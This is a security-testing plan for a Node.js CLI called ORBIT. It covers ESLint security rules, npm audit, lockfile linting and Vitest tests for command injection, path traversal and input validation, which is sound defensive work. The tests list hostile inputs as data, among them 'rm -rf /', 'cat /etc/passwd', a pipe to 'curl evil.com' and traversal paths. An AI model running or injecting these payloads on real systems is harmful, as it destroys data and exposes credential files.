# Security Testing — ORBIT CLI

**Parent:** [← Kembali ke Main](_main.md)
**Status:** ✅ Created

---

## 1. Testing Types for CLI Security

| Type              | Description            | Tool                      | When         |
| :---------------- | :--------------------- | :------------------------ | :----------- |
| **SAST**          | Static code analysis   | ESLint + security plugins | Every commit |
| **SCA**           | Dependency scanning    | npm audit, Snyk           | Every commit |
| **Lockfile Lint** | Lockfile integrity     | lockfile-lint             | Every PR     |
| **Unit Tests**    | Security-focused tests | Vitest                    | Every commit |
| **Manual Review** | Code review            | Human                     | Every PR     |

---

## 2. Static Analysis (SAST)

### 2.1 ESLint Security Configuration

```javascript
// eslint.config.js

import eslint from "@eslint/js";
import tseslint from "typescript-eslint";
import securityPlugin from "eslint-plugin-security";

export default tseslint.config(
  eslint.configs.recommended,
  ...tseslint.configs.strictTypeChecked,

  // Security rules
  {
    plugins: {
      security: securityPlugin,
    },
    rules: {
      // Dangerous functions
      "no-eval": "error",
      "no-implied-eval": "error",
      "no-new-func": "error",

      // Security plugin rules
      "security/detect-child-process": "warn", // Alert on child_process
      "security/detect-non-literal-regexp": "warn",
      "security/detect-object-injection": "warn",
      "security/detect-possible-timing-attacks": "warn",

      // TypeScript strict
      "@typescript-eslint/no-explicit-any": "error",
      "@typescript-eslint/no-unsafe-assignment": "error",
      "@typescript-eslint/no-unsafe-member-access": "error",
    },
  }
);
```

### 2.2 Install Security Plugin

```bash
npm install -D eslint-plugin-security
```

---

## 3. Dependency Scanning (SCA)

### 3.1 npm audit

```bash
# Check for vulnerabilities
npm audit

# Check with severity threshold
npm audit --audit-level=moderate

# Generate JSON report
npm audit --json > audit-report.json

# Auto-fix safe updates
npm audit fix

# Fix all (may break things - review carefully!)
npm audit fix --force
```

### 3.2 npm audit dalam CI

```yaml
# .github/workflows/security.yml
- name: Security Audit
  run: |
    npm audit --audit-level=high
  continue-on-error: false # Fail build on high/critical
```

### 3.3 Lockfile Linting

```bash
# Install
npm install -D lockfile-lint

# Check lockfile integrity
npx lockfile-lint \
  --path package-lock.json \
  --type npm \
  --validate-https \
  --allowed-hosts npm
```

```json
// package.json scripts
{
  "scripts": {
    "lint:lockfile": "lockfile-lint --path package-lock.json --type npm --validate-https --allowed-hosts npm"
  }
}
```

---

## 4. Security Unit Tests

### 4.1 Command Injection Tests

```typescript
// __tests__/security/command-injection.test.ts

import { describe, test, expect } from "vitest";
import { safeExecute } from "../../src/utils/safe-executor.js";

describe("Command Injection Prevention", () => {
  const maliciousInputs = [
    "test; rm -rf /",
    "test && cat /etc/passwd",
    "test | curl evil.com",
    "test$(whoami)",
    "test`whoami`",
    "test\nrm -rf /",
  ];

  test.each(maliciousInputs)(
    "should reject malicious input: %s",
    async (input) => {
      // Should not execute - validate first
      await expect(safeExecute("npm", ["create", input])).rejects.toThrow();
    }
  );

  test("should reject non-whitelisted commands", async () => {
    await expect(safeExecute("rm", ["-rf", "/"])).rejects.toThrow(
      "Command not allowed"
    );
  });
});
```

### 4.2 Path Traversal Tests

```typescript
// __tests__/security/path-traversal.test.ts

import { describe, test, expect } from "vitest";
import { resolveSafe } from "../../src/utils/safe-path.js";

describe("Path Traversal Prevention", () => {
  const basePath = "/home/user/projects";

  const maliciousPaths = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "foo/../../../etc/passwd",
    "foo%2F..%2F..%2Fetc%2Fpasswd",
  ];

  test.each(maliciousPaths)("should reject traversal: %s", (input) => {
    expect(() => resolveSafe(basePath, input)).toThrow();
  });

  test("should allow valid paths", () => {
    expect(resolveSafe(basePath, "my-project")).toBe(
      "/home/user/projects/my-project"
    );
  });
});
```

### 4.3 Input Validation Tests

```typescript
// __tests__/security/validation.test.ts

import { describe, test, expect } from "vitest";
import { ProjectNameSchema } from "../../src/core/validation/schemas.js";

describe("Input Validation", () => {
  const invalidNames = [
    "", // Empty
    ".hidden", // Starts with .
    "_private", // Starts with _
    "UPPERCASE", // Not lowercase
    "has spaces", // Contains spaces
    "../traversal", // Traversal attempt
    "a".repeat(215), // Too long
  ];

  test.each(invalidNames)("should reject invalid project name: %s", (name) => {
    const result = ProjectNameSchema.safeParse(name);
    expect(result.success).toBe(false);
  });

  test("should accept valid project names", () => {
    const validNames = ["my-app", "@scope/package", "project123"];
    validNames.forEach((name) => {
      expect(ProjectNameSchema.safeParse(name).success).toBe(true);
    });
  });
});
```

---

## 5. Test Coverage Requirements

### 5.1 Coverage Thresholds

```typescript
// vitest.config.ts
export default defineConfig({
  test: {
    coverage: {
      provider: "v8",
      reporter: ["text", "json", "html"],
      include: ["src/**/*.ts"],
      exclude: ["src/**/*.test.ts", "src/index.ts"],

      // Minimum thresholds
      thresholds: {
        lines: 80,
        functions: 80,
        branches: 75,
        statements: 80,
      },
    },
  },
});
```

### 5.2 Security-Critical Paths

| Path                    | Required Coverage |
| :---------------------- | :---------------- |
| `src/core/validation/`  | 100%              |
| `src/utils/safe-*.ts`   | 100%              |
| `src/core/errors.ts`    | 90%               |
| `src/utils/executor.ts` | 100%              |

---

## 6. Pre-Release Security Checklist

```markdown
## Security Checklist v1.0

### Static Analysis

- [ ] ESLint passes with 0 errors
- [ ] No security plugin warnings
- [ ] TypeScript strict mode enabled

### Dependency Scanning

- [ ] `npm audit` shows 0 vulnerabilities
- [ ] `lockfile-lint` passes
- [ ] All dependencies at latest secure version

### Unit Tests

- [ ] Command injection tests pass
- [ ] Path traversal tests pass
- [ ] Input validation tests pass
- [ ] Coverage thresholds met

### Code Review

- [ ] No hardcoded secrets
- [ ] All input validated
- [ ] spawn() used (not exec())
- [ ] Error messages sanitized
```
